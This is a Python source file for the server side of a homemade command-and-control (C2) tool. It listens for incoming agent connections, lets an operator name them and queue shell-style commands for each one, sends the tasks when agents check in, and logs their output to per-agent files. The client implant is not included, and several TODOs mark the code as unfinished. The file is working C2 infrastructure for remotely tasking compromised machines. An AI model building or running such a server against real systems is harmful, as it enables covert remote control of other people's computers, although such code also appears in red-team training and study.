"""
Server component of C2
"""
import socket
import threading 
import queue
import time
from menu import *

#TODO: Make an exit function (when server quits, send a message to all clients to quit)
#TODO: Store client sockets and addresses in dictionary
#TODO: Add encryption on both sides

# Host and port to listen for connections on 
HOST = "192.168.232.1"
PORT = 12102

# Create server socket
server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try: 
    server_sock.bind((HOST, PORT))
except:
    print("oops")

# Dictionary of connections [thread_name : queue]
connections = {}

# Flow - after initital connection is established, the client will continually send a heartbeat, asking for new tasks.
# The server responds with new tasks to do (pulled from a queue), or if the queue is empty, sends a null byte
# Client responds with results, then sleeps for x seconds 

# Functions for the menu
# Prints off the connection names
def listconnections():
    if len(connections) == 0:
        print("No active connections\n")
    else: 
        for key in connections:
            print(key)
        print("\n")
    return

# Renames a connection entry
def renameconnections():
    while True:
        old_name = input("Enter the connection you want to rename: ")
        if old_name not in connections:
            print("This entry doesn't exist, try again")
        else:
            new_name = input("Enter the new name of the connection: ")
            if new_name in connections:
                print("Name already exists, try again")
            else:
                connections[new_name] = connections.pop(old_name)
                return

# Creates a connection entry 
def createconnections(): 
    while True: 
        name = input("Enter the name of the connection: ")
        if name in connections:
            print("Name already exists, try again")
        else:
            queue1 = queue.Queue()
            #TODO: allow for choosing and creating a payload
            server_sock.listen(10)
            print("Server is listening...")
            # Getting connection and spawning thread
            (client_sock, client_addr) = server_sock.accept()
            print("Connected from: ", client_addr)
            thread = threading.Thread(target = handle, args = [client_sock, client_addr, name, queue1])
            #Add thread to connection dictionary
            connections[name] = queue1
            thread.daemon = True
            thread.start()
            return

# Opens up a prompt to interact with a client
def interactconnections():
    while True: 
        name = input("Enter the name of the agent to interact with: ")
        if name == "quit":
            break
        elif name not in connections:
            print("Invalid name for agent, try again.")
        else: 
            command_queue = connections[name]
            while True:
                command = input("> ")
                if command == "quit":
                    break
                elif command == "close":
                    command_queue.put(command)
                    # Remove connection from dictionary because connection closed
                    connections.pop(name)
                    break
                else:
                    command_queue.put(command)
               
    return
                        
# Function to handle connection for client (each client is its own thread)
def handle(client_sock, client_addr, name, queue): 
    # Make a file to store results
    filename = "results_" + name + ".txt"
    f = open(filename, "ab", 0)
    # Infinite loop that sends input to and recieves data from client
    while True:
        # Wait for task request
        request = client_sock.recv(1024)

        if(queue.empty()):
            command = "no tasks"
            padCommand = (command.ljust(1024, "\0")).encode("utf-8")
            client_sock.send(padCommand)
            time.sleep(5)
        else:
            command = queue.get()
            padCommand = (command.ljust(1024, "\0")).encode("utf-8")
            #TODO: catch error for when forcibly closed
            client_sock.send(padCommand)

            # Receiving output from the client
            #TODO: Move closing the socket to closeconnections
            #TODO: Create some way to differentiate between displaying command output and downloading into a file
            if(command != "close"):
                # Recieve one byte at a time, end character is 0xFF
                #output = bytes.decode(client_sock.recv(1))
                output = client_sock.recv(1)
                while True: 
                    data = client_sock.recv(1)
                    if(data == b"\xff"):
                        break
                    #output += bytes.decode(data)
                    output += data
                #print(output)
                f.write(output + b"\n")
            else: # closing the connection
                f.close()
                break

    # Close client socket when done
    client_sock.close()

# TODO: Create sick command menu for interacting with server
def main():    
    main_menu()

    # Close server socket
    server_sock.close()

if __name__ == '__main__':
    main()